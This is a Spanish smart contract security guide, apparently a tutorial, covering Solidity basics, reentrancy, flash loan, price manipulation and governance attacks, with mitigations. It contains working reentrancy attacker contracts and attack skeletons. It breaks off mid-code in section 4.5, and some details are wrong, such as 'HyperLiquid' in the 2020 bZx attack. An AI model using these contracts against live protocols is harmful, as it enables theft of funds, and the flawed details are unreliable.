# Web3 y Smart Contracts — Guía Ultra-Detallada

> **Versión**: 1.0 | **Idioma**: Español (AR) | **Nivel**: Intermedio-Avanzado

---

## Índice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (3483 lineas)


1. [Introducción](#1-introducción)
2. [Fundamentos de Solidity](#2-fundamentos-de-solidity)
   - 2.1 [Tipos de Datos](#21-tipos-de-datos)
   - 2.2 [Storage Layout](#22-storage-layout)
   - 2.3 [Function Visibility](#23-function-visibility)
   - 2.4 [Modifiers](#24-modifiers)
   - 2.5 [Events](#25-events)
   - 2.6 [Structs y Enums](#26-structs-y-enums)
   - 2.7 [Mapping y Arrays](#27-mapping-y-arrays)
   - 2.8 [Herencia en Solidity](#28-herencia-en-solidity)
   - 2.9 [Receive y Fallback](#29-receive-y-fallback)
   - 2.10 [Gas y Optimización](#210-gas-y-optimización)
3. [Reentrancy Attacks](#3-reentrancy-attacks)
   - 3.1 [DAO Hack](#31-dao-hack)
   - 3.2 [Single Function Reentrancy](#32-single-function-reentrancy)
   - 3.3 [Cross-Function Reentrancy](#33-cross-function-reentrancy)
   - 3.4 [Read-Only Reentrancy](#34-read-only-reentrancy)
   - 3.5 [Mitigaciones: Checks-Effects-Interactions](#35-mitigaciones-checks-effects-interactions)
   - 3.6 [Reentrancy Guards](#36-reentrancy-guards)
4. [Flash Loan Attacks](#4-flash-loan-attacks)
   - 4.1 [Cómo Funcionan los Flash Loans](#41-cómo-funcionan-los-flash-loans)
   - 4.2 [Arbitrage](#42-arbitrage)
   - 4.3 [Price Manipulation](#43-price-manipulation)
   - 4.4 [Governance Attacks](#44-governance-attacks)
   - 4.5 [Collateral Bypass](#45-collateral-bypass)
   - 4.6 [Cross-Protocol Flash Loan Attacks](#46-cross-protocol-flash-loan-attacks)
5. [Front-Running](#5-front-running)
   - 5.1 [Mempool Monitoring](#51-mempool-monitoring)
   - 5.2 [Gas Price Bidding](#52-gas-price-bidding)
   - 5.3 [Sandwich Attacks](#53-sandwich-attacks)
   - 5.4 [Time-Bandit Attacks](#54-time-bandit-attacks)
   - 5.5 [Dark Forest y MEV](#55-dark-forest-y-mev)
   - 5.6 [Mitigaciones contra Front-Running](#56-mitigaciones-contra-front-running)
6. [Oracle Manipulation](#6-oracle-manipulation)
   - 6.1 [Price Feed Manipulation](#61-price-feed-manipulation)
   - 6.2 [TWAP Oracle Attacks](#62-twap-oracle-attacks)
   - 6.3 [Chainlink Oracle Issues](#63-chainlink-oracle-issues)
   - 6.4 [Custom Oracle Exploits](#64-custom-oracle-exploits)
   - 6.5 [Mitigaciones de Oracle](#65-mitigaciones-de-oracle)
7. [DeFi Logic Abuse](#7-defi-logic-abuse)
   - 7.1 [Lending Protocol Attacks](#71-lending-protocol-attacks)
   - 7.2 [AMM Manipulation](#72-amm-manipulation)
   - 7.3 [Yield Aggregator Attacks](#73-yield-aggregator-attacks)
   - 7.4 [Staking Pool Exploits](#74-staking-pool-exploits)
   - 7.5 [Bridge Attacks](#75-bridge-attacks)
8. [Smart Contract Auditing](#8-smart-contract-auditing)
   - 8.1 [Slither](#81-slither)
   - 8.2 [Mythril](#82-mythril)
   - 8.3 [Echidna](#83-echidna)
   - 8.4 [Foundry Fuzzing](#84-foundry-fuzzing)
   - 8.5 [Formal Verification](#85-formal-verification)
9. [Common Vulnerabilities](#9-common-vulnerabilities)
   - 9.1 [Access Control](#91-access-control)
   - 9.2 [Arithmetic Issues](#92-arithmetic-issues)
   - 9.3 [Unchecked Calls](#93-unchecked-calls)
   - 9.4 [Signature Replay](#94-signature-replay)
   - 9.5 [DELEGATECALL Abuse](#95-delegatecall-abuse)
   - 9.6 [Timestamp Dependence](#96-timestamp-dependence)
   - 9.7 [Short Address Attack](#97-short-address-attack)
   - 9.8 [Race Conditions](#98-race-conditions)
   - 9.9 [Storage Collision](#99-storage-collision)
   - 9.10 [Phantom Functions](#910-phantom-functions)
10. [Herramientas](#10-herramientas)
    - 10.1 [Foundry](#101-foundry)
    - 10.2 [Hardhat](#102-hardhat)
    - 10.3 [Brownie](#103-brownie)
    - 10.4 [Slither](#104-slither)
    - 10.5 [Mythril](#105-mythril)
    - 10.6 [Echidna](#106-echidna)
    - 10.7 [TheEye](#107-theeye)
    - 10.8 [Dedaub](#108-dedaub)
11. [Escenarios Prácticos](#11-escenarios-prácticos)
    - 11.1 [Escenario 1: Reentrancy Clásica](#111-escenario-1-reentrancy-clásica)
    - 11.2 [Escenario 2: Flash Loan Price Manipulation](#112-escenario-2-flash-loan-price-manipulation)
    - 11.3 [Escenario 3: Sandwich Attack](#113-escenario-3-sandwich-attack)
    - 11.4 [Escenario 4: Oracle Manipulation](#114-escenario-4-oracle-manipulation)
    - 11.5 [Escenario 5: DELEGATECALL Exploit](#115-escenario-5-delegatecall-exploit)
12. [Ejercicios Prácticos](#12-ejercicios-prácticos)
13. [Referencias y Recursos](#13-referencias-y-recursos)

---

## 1. Introducción

[web3](../raw/w3b3-sm4rt-c0ntr4cts.md) y los smart contracts transformaron las finanzas, la gobernanza y la propiedad digital. Pero con miles de millones de dólares en juego, los bugs en smart contracts son cacería de tesoros.

Esta guía cubre la seguridad de smart contracts desde cero: cómo funciona [solidity](../raw/w3b3-sm4rt-c0ntr4cts.md#solidity) internamente, los ataques más famosos (con código real), las herramientas de auditoría, y cómo proteger tus contratos.

> **Advertencia legal**: Todo el contenido es educativo. No ataques contratos sin autorización. Usá testnets (Sepolia, Goerli) o forks locales para practicar.

---

## 2. Fundamentos de [solidity](../raw/w3b3-sm4rt-c0ntr4cts.md#solidity)

### 2.1 Tipos de Datos

Solidity es un lenguaje tipado estáticamente. Los tipos determinan cómo se almacenan y manipulan los datos en la EVM.

**Tipos de Valor** (se copian cuando se asignan):

```solidity
// Enteros
uint8   → 0 a 255            (8 bits)
uint16  → 0 a 65,535
uint256 → 0 a 2^256 - 1       (el más usado)
int256  → -2^255 a 2^255 - 1

// Booleanos
bool    → true / false

// Direcciones
address          → 20 bytes (160 bits)
address payable  → address + funciones de transferencia

// Bytes fijos
bytes1  → 1 byte
bytes32 → 32 bytes

// Enums (son uint8 internamente)
enum Estado { Activo, Inactivo, Bloqueado }
```

**Tipos de Referencia** (se pasan por referencia/ubicación):

```solidity
// Arrays
uint256[] public numeros;           // Dinámico
uint256[10] public fijo;            // Fijo
string[] public textos;

// Strings (no nativamente, son arrays de bytes)
string public texto;

// Structs
struct Persona {
    string nombre;
    uint256 edad;
    address wallet;
}

// Mappings
mapping(address => uint256) public balances;
mapping(uint256 => Persona) public personas;
mapping(address => mapping(uint256 => bool)) public tokens;
```

**Ubicaciones de datos**:

```solidity
// storage  → persistido en la blockchain (estado del contrato)
// memory   → temporal, existe solo durante ejecución
// calldata → parámetros de entrada (read-only, más barato)

function ejemplo(string memory _mem, string calldata _cal) public {
    string storage _sto = variableDeEstado;  // Referencia al storage
}
```

### 2.2 Storage Layout

El storage de la EVM es un array de 2^256 slots de 32 bytes cada uno. Cada slot se identifica por un keccak256 [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions).

**Reglas de layout**:

```
Slot 0:  primera variable de estado (32 bytes)
Slot 1:  segunda variable de estado
...
Slot keccak256(key): mappings
Slot keccak256(keccak256(array_index)): arrays dinámicos
```

**Ejemplo concreto**:

```solidity
contract StorageDemo {
    uint256 a;       // Slot 0
    uint256 b;       // Slot 1
    address c;       // Slot 2 (solo 20 bytes, resto padding)
    uint8 d;         // Slot 2 (comparte slot con c!)
    uint256 e;       // Slot 3
    mapping(uint256 => uint256) f;  // Slot 4: elementos en keccak256(h(k) . p)
    // donde k es la key, p es el slot del mapping
}
```

**Slot packing**: variables más chicas que 32 bytes se empaquetan en el mismo slot si es posible:

```solidity
// Variables empaquetadas
uint128 a;  // bytes 0-15
uint128 b;  // bytes 16-31
// Ambas en Slot 0

// Variables NO empaquetables
uint128 a;
uint256 b;  // Ocupa slot completo, a se queda sola en slot 0
```

**Leer storage desde afuera**:

```solidity
// En ethers.js
const value = await ethers.provider.getStorageAt(contractAddress, slotNumber);

// En Foundry
uint256 val = vm.load(address(contract), slotBytes32);
```

**Calcular slot de mapping**:

```solidity
// Para mapping(uint256 => uint256) en slot 4:
// key = 5
// slot = keccak256(abi.encode(5, 4))

// Solidity puro:
function getMappingSlot(address key, uint256 mappingSlot) public pure returns (bytes32) {
    return keccak256(abi.encode(key, mappingSlot));
}
```

### 2.3 Function Visibility

Solidity tiene 4 niveles de visibilidad:

```solidity
// external  → solo llamadas externas (más barato para parámetros grandes)
// public    → interna y externa
// internal  → solo este contrato y derivados
// private   → solo este contrato (NO es privado en la blockchain)

contract Visibilidad {
    function externa() external pure returns (uint256) { return 1; }
    function publica() public pure returns (uint256) { return 2; }
    function interna() internal pure returns (uint256) { return 3; }
    function privada() private pure returns (uint256) { return 4; }
    
    function testInternal() public pure {
        this.externa();   // OK (external call)
        this.publica();   // OK (external call)
        // this.interna(); // ERROR (no external)
        // this.privada(); // ERROR (no external)
        
        externa();  // OK (internal call)
        publica();  // OK (internal call)
        interna();  // OK (internal call)
        privada();  // OK (internal call)
    }
}
```

**IMPORTANTE**: `private` NO es privado en la [blockchain](../raw/w3b3-sm4rt-c0ntr4cts.md#blockchain). Todo el storage es legible. Solo es privado a nivel de bytecode (no genera selector de función).

### 2.4 Modifiers

Los modifiers encapsulan lógica de control de acceso y validación:

```solidity
contract Modifiers {
    address public owner;
    bool public paused;
    
    constructor() {
        owner = msg.sender;
    }
    
    // Modifier básico
    modifier onlyOwner() {
        require(msg.sender == owner, "No sos el owner");
        _;  // ← Continúa la ejecución de la función
    }
    
    // Modifier con parámetros
    modifier notPaused() {
        require(!paused, "Contrato pausado");
        _;
    }
    
    // Modifier que modifica parámetros
    modifier ensurePositive(uint256 _amount) {
        require(_amount > 0, "Monto debe ser positivo");
        _;
    }
    
    // Uso
    function withdraw(uint256 amount) public onlyOwner notPaused ensurePositive(amount) {
        payable(owner).transfer(amount);
    }
    
    // Modifier más complejo (antirreentrancia)
    bool private _locked;
    modifier noReentrant() {
        require(!_locked, "No reentrancy");
        _locked = true;
        _;
        _locked = false;
    }
}
```

**Orden de ejecución de modifiers**:

```solidity
// Si llamás withdraw(100):
// 1. Se ejecuta onlyOwner (antes del _;)
// 2. Se ejecuta notPaused (antes del _;)
// 3. Se ejecuta ensurePositive (antes del _;)
// 4. Se ejecuta el cuerpo de withdraw
// 5. Se ejecuta notPaused (después del _;)? NO, solo hay un _;
// 6. Se ejecuta onlyOwner después? NO.

// Los modifiers se ejecutan en orden anidado:
// onlyOwner { notPaused { ensurePositive { withdraw() } } }
```

### 2.5 Events

Los events son la forma de logging en Ethereum. Se almacenan en los transaction receipts (no en storage).

```solidity
contract Events {
    // Declaración de evento
    event Transfer(
        address indexed from,    // indexed: se puede filtrar
        address indexed to,
        uint256 value
    );
    
    event Deposit(
        address indexed user,
        uint256 amount,
        uint256 timestamp
    );
    
    // Event sin parámetros indexados
    event Log(string message);
    
    function transfer(address to, uint256 amount) public {
        // Lógica...
        emit Transfer(msg.sender, to, amount);
    }
    
    function deposit() public payable {
        emit Deposit(msg.sender, msg.value, block.timestamp);
        emit Log("Depósito recibido");
    }
}
```

**Indexed parameters**: hasta 3 parámetros pueden ser `indexed`. Se almacenan como topics en el log (se pueden buscar/filtrar).

**Event signatures**: keccak256("Transfer(address,address,uint256)")

**Ver eventos desde ethers.js**:

```javascript
// Filtrar por evento
contract.on("Transfer", (from, to, value) => {
    console.log(from, to, value);
});

// Filtrar por address indexada
const filter = contract.filters.Transfer(myAddress);
const events = await contract.queryFilter(filter, 0, "latest");
```

### 2.6 Structs y Enums

**Structs** para datos complejos:

```solidity
contract Structs {
    enum Estado { Pendiente, Activo, Completado }
    
    struct Orden {
        uint256 id;
        address comprador;
        address vendedor;
        uint256 precio;
        uint256 cantidad;
        Estado estado;
        uint256 createdAt;
    }
    
    mapping(uint256 => Orden) public ordenes;
    uint256 public nextId;
    
    function crearOrden(uint256 _precio, uint256 _cantidad) public returns (uint256) {
        uint256 id = nextId++;
        ordenes[id] = Orden({
            id: id,
            comprador: address(0),
            vendedor: msg.sender,
            precio: _precio,
            cantidad: _cantidad,
            estado: Estado.Pendiente,
            createdAt: block.timestamp
        });
        emit OrdenCreada(id);
        return id;
    }
    
    // Leer struct completo
    function getOrden(uint256 _id) public view returns (Orden memory) {
        return ordenes[_id];
    }
    
    // Actualizar struct parcialmente
    function completerOrden(uint256 _id) public {
        Orden storage orden = ordenes[_id];
        orden.estado = Estado.Completado;
    }
}
```

### 2.7 Mapping y Arrays

**Mappings** (diccionarios hash):

```solidity
contract MappingExamples {
    // Mapping simple
    mapping(address => uint256) public balances;
    
    // Mapping anidado
    mapping(address => mapping(address => uint256)) public allowance;
    
    // Mapping a struct
    mapping(uint256 => Usuario) public usuarios;
    
    // Mapping con arrays (no possible mapping a array)
    // mapping(uint256 => bytes32[]) public listas; // NO COMPILA
    
    // Pero sí mapping a struct con array adentro
    struct Lista {
        bytes32[] items;
    }
    mapping(uint256 => Lista) public listas;
    
    function setBalance(uint256 _amount) public {
        balances[msg.sender] = _amount;
    }
    
    function setAllowance(address _spender, uint256 _amount) public {
        allowance[msg.sender][_spender] = _amount;
    }
}
```

**Arrays dinámicos**:

```solidity
contract ArrayExample {
    uint256[] public numeros;
    
    function push(uint256 _n) public {
        numeros.push(_n);
    }
    
    function pop() public {
        numeros.pop();
    }
    
    // Eliminar con swap-and-pop (para no dejar huecos)
    function remove(uint256 _index) public {
        require(_index < numeros.length, "Index out of bounds");
        numeros[_index] = numeros[numeros.length - 1];
        numeros.pop();
    }
    
    // Obtener todos los elementos (cuidado con el gas!)
    function getAll() public view returns (uint256[] memory) {
        return numeros;
    }
    
    // Length
    function size() public view returns (uint256) {
        return numeros.length;
    }
}
```

### 2.8 Herencia en Solidity

Solidity soporta herencia múltiple (con orden de linearización C3 Linearization):

```solidity
contract A {
    event Log(string message);
    
    function foo() public virtual {
        emit Log("A.foo");
    }
}

contract B is A {
    // Override
    function foo() public virtual override {
        emit Log("B.foo");
        super.foo();  // Llama a A.foo
    }
}

contract C is A {
    function foo() public virtual override {
        emit Log("C.foo");
    }
}

contract D is B, C {
    function foo() public override(B, C) {
        // super usa C3 linearization
        super.foo();  // Llama a C.foo (último en orden)
    }
}

// Orden de inicialización
// D → B → C → A
```

**Herencia de interfaces**:

```solidity
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

// Implementación
contract MyToken is IERC20 {
    function transfer(address to, uint256 amount) external override returns (bool) {
        // implementación
    }
}
```

### 2.9 Receive y Fallback

Funciones especiales que se ejecutan cuando un contrato recibe ETH o cuando se llama a una función que no existe.

```solidity
contract ReceiveFallback {
    event Received(address sender, uint256 amount);
    event FallbackCalled(address sender, bytes data);
    
    // receive: se ejecuta en CALLDATA vacío (transferencia de ETH)
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
    
    // fallback: se ejecuta cuando el selector de función no coincide
    fallback() external payable {
        emit FallbackCalled(msg.sender, msg.data);
    }
    
    // Reglas:
    // receive() + calldata vacío → receive()
    // receive() + calldata no vacío → fallback()
    // No receive() + calldata vacío → fallback()
    // No receive() ni fallback() + ETH → REVERT
}
```

### 2.10 Gas y Optimización

Cada operación en la EVM consume gas. Entender el costo es clave para ataques y defensas.

**Costos de gas (EIP-2028, EIP-2200)**:

| Operación | Gas | Descripción |
|---|---|---|
| `ADD` | 3 | Suma |
| `SLOAD` | 2100 (cold) / 100 (warm) | Leer storage |
| `SSTORE` | 20000 ([set](../raw/ph1sh1ng.md#social-engineering-toolkit)) / 5000 (reset) / 100 (refund) | Escribir storage |
| `BALANCE` | 2600 (cold) / 100 (warm) | Balance de address |
| `CALL` | 2600 + | Llamar a otro contrato |
| `SELFDESTRUCT` | 5000 | Autodestrucción |
| `MLOAD` | 3 | Leer memory |
| `MSTORE` | 3 | Escribir memory |
| `KECCAK256` | 30 + 6 * words | Hash |

**Optimizaciones**:

```solidity
contract GasOptimization {
    // MAL: iteración que puede revertir por gas
    function pagarATodos(address[] memory _recipients) public {
        for (uint256 i = 0; i < _recipients.length; i++) {
            payable(_recipients[i]).transfer(1 ether);
        }
    }
    
    // BIEN: paginado o pull-based
    mapping(address => uint256) public recompensas;
    
    function setRecompensas(address[] memory _recipients) public {
        for (uint256 i = 0; i < _recipients.length; i++) {
            recompensas[_recipients[i]] = 1 ether;
        }
    }
    
    function claimReward() public {
        uint256 amount = recompensas[msg.sender];
        require(amount > 0, "Sin recompensas");
        recompensas[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }
}
```

---

## 3. Reentrancy Attacks

La reentrancia es el bug más famoso de smart contracts. Ocurre cuando un contrato llama a otro y ese contrato vuelve a llamar al primero antes de que la primera llamada termine.

### 3.1 DAO Hack

El 17 de junio de 2016, el DAO (The DAO) fue atacado usando reentrancia. Se robaron 3.6M ETH (~$70M en ese momento).

**El bug original**:

```solidity
// SIMPLIFICACIÓN del contrato vulnerable del DAO
contract DaoVulnerable {
    mapping(address => uint256) public balances;
    
    // La función es pública y permite que cualquiera llame a withdraw
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        
        // Las siguientes 3 líneas son el problema:
        // 1. Envía ETH (llama al contrato atacante)
        // 2. El contrato atacante tiene un fallback que llama de nuevo a withdraw
        // 3. balances[msg.sender] todavía no se actualizó!
        msg.sender.call{value: _amount}("");
        
        // Esto se ejecuta DESPUÉS de enviar ETH
        balances[msg.sender] -= _amount;
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}
```

**Contrato atacante**:

```solidity
contract DaoAttacker {
    DaoVulnerable public target;
    address public owner;
    uint256 public totalStolen;
    
    constructor(address _target) {
        target = DaoVulnerable(_target);
        owner = msg.sender;
    }
    
    // El ataque empieza depositando y luego retirando
    function attack() external payable {
        require(msg.sender == owner, "No sos owner");
        
        // Depositar ETH
        target.deposit{value: msg.value}();
        
        // Retirar (esto gatilla el loop de reentrancia)
        target.withdraw(msg.value);
        
        // Al salir del loop, ya drenamos el contrato
        // Transferimos todo al owner
        payable(owner).transfer(address(this).balance);
    }
    
    // Esta función se ejecuta CADA VEZ que recibimos ETH
    receive() external payable {
        totalStolen += msg.value;
        
        // Mientras el target tenga balance, seguimos retirando
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}
```

**Flujo del ataque**:

```
1. Atacante: attack(value)
2. DaoVulnerable.deposit(value)
3. DaoVulnerable.withdraw(value)
4. check: balances[atacante] >= value (TRUE)
5. msg.sender.call{value: value}("") → envía ETH al atacante
6. Atacante.receive()
7.   Atacante: target.withdraw(value)  ← REENTRANCY!
8.   check: balances[atacante] >= value (TRUE! porque no se actualizó)
9.   msg.sender.call{value: value}("") → más ETH
10.  Atacante.receive()
11.    target.withdraw(value)
12.    ... loop hasta que el target se vacía ...
13. balances[atacante] -= value  ← esto pasa eventualmente
     pero el daño ya está hecho
```

El hack del DAO llevó al hard fork de Ethereum (ETH vs ETC).

### 3.2 Single Function Reentrancy

Es la reentrancia más simple: la misma función se llama recursivamente.

**Ejemplo típico** (la función `withdraw` es llamada recursivamente):

```solidity
contract VaultVulnerable {
    mapping(address => uint256) public stakes;
    
    function stake() public payable {
        stakes[msg.sender] += msg.value;
    }
    
    function unstake() public {
        uint256 amount = stakes[msg.sender];
        require(amount > 0, "Sin stake");
        
        // PELIGRO: enviamos antes de actualizar
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        stakes[msg.sender] = 0;  // ← esto debería ir ANTES
    }
    
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

**Contrato atacante genérico**:

```solidity
contract ReentrancyAttacker {
    VaultVulnerable public vault;
    uint256 public attackCount;
    
    constructor(address _vault) {
        vault = VaultVulnerable(_vault);
    }
    
    function execute(uint256 _amount) external payable {
        require(msg.value == _amount, "Send exact amount");
        
        // Stake
        vault.stake{value: _amount}();
        
        // Atacar
        vault.unstake();
    }
    
    receive() external payable {
        attackCount++;
        if (attackCount < 10 && address(vault).balance > 0) {
            vault.unstake();
        }
    }
    
    // Retirar lo robado
    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

### 3.3 Cross-Function Reentrancy

Más sutil: una función llama a otra función diferente que comparte el mismo estado.

```solidity
contract CrossFunctionReentrancy {
    mapping(address => uint256) public stakes;
    
    function stake() public payable {
        stakes[msg.sender] += msg.value;
    }
    
    function unstake() public {
        uint256 amount = stakes[msg.sender];
        require(amount > 0, "Sin stake");
        
        // Extrenal call ANTES de actualizar estado
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        
        stakes[msg.sender] = 0;
    }
    
    // Esta función comparte el mismo estado (stakes) con unstake
    function transferStake(address _to, uint256 _amount) public {
        require(stakes[msg.sender] >= _amount, "Balance insuficiente");
        
        stakes[msg.sender] -= _amount;
        stakes[_to] += _amount;
    }
}
```

**Ataque cross-function**: El atacante llama a `unstake()`, en el `receive` llama a `transferStake()` a otra cuenta que controla, y repite.

### 3.4 Read-Only Reentrancy

La más sutil de todas: el estado del contrato A se modifica durante la reentrancia, y el contrato B lee ese estado como si fuera consistente.

```solidity
// Contrato A (vulnerable a reentrancia)
contract LiquidityPool {
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 public totalReserves;
    
    function deposit() public payable {
        uint256 newShares = msg.value * totalShares / totalReserves;
        // ... simplificación
        shares[msg.sender] += newShares;
        totalShares += newShares;
        totalReserves += msg.value;
    }
    
    function withdraw(uint256 _shares) public {
        uint256 amount = _shares * totalReserves / totalShares;
        
        // Reentrancia posible aquí
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        
        totalReserves -= amount;
        totalShares -= _shares;
        shares[msg.sender] -= _shares;
    }
    
    function getPrice() public view returns (uint256) {
        return totalReserves / totalShares;  // ← Esta view se puede leer DURANTE reentrancia
    }
}

// Contrato B (lee el estado de A)
contract PriceOracle {
    LiquidityPool public pool;
    
    function getTWAP() public view returns (uint256) {
        uint256 price = pool.getPrice();
        // ... cálculos ...
        return price;
    }
}
```

**Ataque**: Durante la reentrancia, `totalReserves` y `totalShares` están inconsistente. Cualquier contrato que lea `getPrice()` durante la transacción obtiene un valor manipulado.

### 3.5 Mitigaciones: Checks-Effects-Interactions

El patrón más importante en seguridad de smart contracts:

```
1. CHECKS: validar todas las condiciones
2. EFFECTS: actualizar el estado del contrato
3. INTERACTIONS: llamar a contratos externos
```

```solidity
// ✅ SEGURO: Checks-Effects-Interactions
function withdrawSafe(uint256 _amount) public {
    // CHECKS
    require(balances[msg.sender] >= _amount, "Balance insuficiente");
    
    // EFFECTS (actualizar estado PRIMERO)
    balances[msg.sender] -= _amount;
    
    // INTERACTIONS (llamada externa DESPUÉS)
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Transfer failed");
}

// ❌ VULNERABLE: Interactions antes de Effects
function withdrawVulnerable(uint256 _amount) public {
    require(balances[msg.sender] >= _amount);
    
    // INTERACTIONS (antes de actualizar estado)
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success);
    
    // EFFECTS (demasiado tarde)
    balances[msg.sender] -= _amount;
}
```

### 3.6 Reentrancy Guards

El `ReentrancyGuard` de OpenZeppelin:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeContract is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function withdraw(uint256 _amount) public nonReentrant {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] -= _amount;
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success);
    }
}
```

**Implementación manual**:

```solidity
// Reentrancy guard como modifier
bool private _notEntered = true;

modifier nonReentrant() {
    require(_notEntered, "ReentrancyGuard: reentrant call");
    _notEntered = false;
    _;
    _notEntered = true;
}

// Mutex más simple
modifier noReentrant() {
    require(!locked, "No reentrancy");
    locked = true;
    _;
    locked = false;
}
```

**Limitaciones**: El nonReentrant previene reentrancia pero NO previene cross-function reentrancia si ambas funciones usan el mismo estado pero distintos guards.

---

## 4. Flash Loan Attacks

### 4.1 Cómo Funcionan los Flash Loans

Un flash loan es un préstamo que se toma y devuelve en la MISMA transacción. Si no se devuelve, la transacción revierte.

**Protocolos que ofrecen flash loans**: Aave, dYdX, Uniswap V2/V3 (flash swaps), Balancer, etc.

**Flujo**:

```
1. Pedir flash loan (ej: 1M DAI)
2. Usar los fondos para atacar (manipular precio, arbitraje, etc.)
3. Devolver el préstamo + fee
4. Quedarse con la ganancia
```

**Ejemplo en [solidity](../raw/w3b3-sm4rt-c0ntr4cts.md#solidity) (Aave V3)**:

```solidity
import "@aave/core-v3/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";

contract FlashLoanAttack is FlashLoanSimpleReceiverBase {
    address public owner;
    IERC20 public dai;
    
    constructor(address _addressProvider, address _dai)
        FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider))
    {
        owner = msg.sender;
        dai = IERC20(_dai);
    }
    
    // Iniciar el ataque
    function startAttack(uint256 _amount) external {
        require(msg.sender == owner, "No owner");
        
        // Pedir flash loan
        POOL.flashLoanSimple(
            address(this),
            address(dai),
            _amount,
            abi.encode(owner),
            0
        );
    }
    
    // Callback que se ejecuta cuando recibimos los fondos
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        // Acá implementamos el ataque
        // amount = lo que pedimos
        // premium = fee (~0.09%)
        
        // 1. Manipular precio
        // 2. Arbitraje
        // 3. Liquidación
        // etc.
        
        // Aprobar la devolución
        IERC20(asset).approve(address(POOL), amount + premium);
        
        return true;
    }
}
```

### 4.2 Arbitrage

El uso más básico de flash loans: comprar barato en un DEX y vender caro en otro.

**Ejemplo: Arbitraje Uniswap → Sushiswap**:

```solidity
contract ArbitrageAttack {
    IUniswapV2Router public uniswapRouter;
    IUniswapV2Router public sushiswapRouter;
    IERC20 public tokenA;
    IERC20 public tokenB;
    
    // Pre-approve routers
    // ...
    
    function executeArbitrage(uint256 _amountIn) external {
        // Solo por simplicidad, asumimos que tenemos los tokens
        // En realidad se usaría flash loan
        
        tokenA.approve(address(uniswapRouter), _amountIn);
        
        // 1. Comprar tokenB en Uniswap
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);
        
        uint256[] memory amounts = uniswapRouter.swapExactTokensForTokens(
            _amountIn, 0, path, address(this), block.timestamp
        );
        
        uint256 tokenBAmount = amounts[1];
        
        // 2. Vender tokenB en Sushiswap
        tokenB.approve(address(sushiswapRouter), tokenBAmount);
        
        path[0] = address(tokenB);
        path[1] = address(tokenA);
        
        amounts = sushiswapRouter.swapExactTokensForTokens(
            tokenBAmount, 0, path, address(this), block.timestamp
        );
        
        uint256 profit = amounts[1] - _amountIn;
        
        require(profit > 0, "No hay ganancia");
        
        // Enviar ganancia al owner
        tokenA.transfer(msg.sender, profit);
    }
}
```

**Problemas prácticos**:
- Los routers Uniswap/Sushiswap usan distintas tarifas
- Slippage protection
- La ganancia debe superar el fee del flash loan + gas
- MEV bots pueden front-run tu transacción

### 4.3 Price Manipulation

Los flash loans permiten mover grandes cantidades de liquidez, manipulando precios de oráculos basados en reserves.

**Ataque clásico: inflar precio para liquidar posiciones**:

```solidity
contract PriceManipulationAttack {
    IUniswapV2Pair public pair;
    IERC20 public token;
    LendingProtocol public lending;
    
    function attack() external {
        // 1. Flash loan de token
        // 2. Swap grande en Uniswap (manipula precio)
        
        token.transfer(address(pair), hugeAmount);
        pair.swap(0, hugeAmountOut, address(this), "");
        
        // 3. Ahora Uniswap dice que token = caro
        // 4. Usar ese precio manipulado en el protocolo de lending
        // 5. Si es un oráculo basado en reserves Uniswap, está manipulado
        
        lending.liquidate(victimPosition);
        
        // 6. Devolver flash loan
        // 7. Quedarse con el colateral liquidado
    }
}
```

**Ataque real: bZx Protocol (feb 2020)**:

El atacante usó un flash loan de 10,000 ETH de dYdX para:
1. Depositar ETH como colateral en bZx
2. Tomar prestado wBTC
3. Shortear wBTC en Uniswap/HyperLiquid
4. Manipular el precio para causar liquidación
5. Ganancia: ~$350k

### 4.4 Governance Attacks

Usar flash loans para acumular poder de voto temporalmente y pasar propuestas maliciosas.

**Cómo funciona**:

```solidity
contract GovernanceAttack {
    IGovernance public gov;
    IERC20 public governanceToken;
    
    function attack() external {
        // 1. Flash loan de governance token
        // 2. Delegatear los tokens a nosotros mismos
        governanceToken.delegate(address(this));
        
        // 3. Proponer y votar propuesta maliciosa
        address[] memory targets = new address[](1);
        targets[0] = address(vault);
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSelector(
            Vault.transfer.selector, address(this), vault.balance()
        );
        
        gov.propose(targets, values, calldatas, "Drain vault");
        
        // 4. Votar
        gov.castVote(proposalId, true);
        
        // 5. Ejecutar (si pasa)
        gov.execute(proposalId);
        
        // 6. Devolver flash loan (los tokens ya no están delegados)
    }
}
```

**Mitigaciones**:
- `block.timestamp` para evitar delegación en el mismo bloque
- Snapshot-based voting (no token balance actual)
- Flash loan detection en propuestas

### 4.5 Collateral Bypass

Usar flash loans para depositar colateral temporal, tomar prestado, y devolver el colateral.

**Ataque a protocolos préstamo**: El atacante deposita colateral (con flash loan), toma prestado el máximo, devuelve el flash loan, y se queda con los fondos prestados.

```solidity
contract CollateralBypassAttack {
    ILendingPool public pool;
    
    function attack(address _collateralAsset, address _borrowAsset, uint256 _amount) external {
        // 1. Flash loan de _collateralAsset
